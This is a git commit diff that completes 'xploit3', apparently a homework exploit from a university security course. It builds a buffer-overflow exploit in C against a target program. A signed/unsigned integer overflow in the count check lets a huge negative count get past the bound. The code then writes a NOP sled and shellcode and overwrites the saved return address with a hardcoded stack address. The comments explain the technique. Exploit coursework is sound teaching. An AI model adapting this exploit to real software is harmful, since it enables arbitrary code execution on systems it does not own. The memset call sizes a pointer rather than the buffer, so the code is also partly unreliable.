a20048f675640596edca29ebc6e2cdea016e28bb
Minjian Liu <mj.liu@silabs.com>
2023-04-14 20:42:45 -0400

    Complete xploit3

--- proj1/xploits/xploit3.c
+++ proj1/xploits/xploit3.c
@@ -7,13 +7,34 @@
 #define DEFAULT_FILE "/tmp/xploit3_output"
 #define SIZE 24024
 
+struct target_widget_t {
+  double x;
+  double y;
+  long count;
+};
+
+#define TARGET_MAX_WIDGETS 1000
+
 int main(void)
 {
   // This exploit will likely require more memory than fits on the stack
-  size_t exploit_size = 0;  // TODO determine exploit size
+  // Determine exploit size
+  // As we can see "if (count < MAX_WIDGETS)" in the target and count is signed long
+  // We can find a negative number to bypass the condition and its unsigned value allow
+  // us to overflow the buff, rbp and rip.
+  // The value we can find is "9223372036854776809 * 24 = 24024".
+  char *exploit_count_string = "9223372036854776809,";
+  size_t count_string_len = strlen(exploit_count_string);
+  size_t exploit_size = count_string_len + SIZE;
+
   char *exploit = malloc(exploit_size);
 
-  // TODO fill exploit buffer
+  // Fill exploit buffer
+  memset(exploit, '\x90', sizeof(exploit));
+  memcpy(exploit, exploit_count_string, count_string_len);
+  memcpy(exploit + count_string_len, shellcode, sizeof(shellcode) - 1);
+  int buf_size = TARGET_MAX_WIDGETS * sizeof(struct target_widget_t);
+  *(size_t *)(exploit + count_string_len + buf_size + 8) = 0x7ffffffe8f48;
 
   // Write xploit buffer to file
   write_xploit(exploit, exploit_size, DEFAULT_FILE);
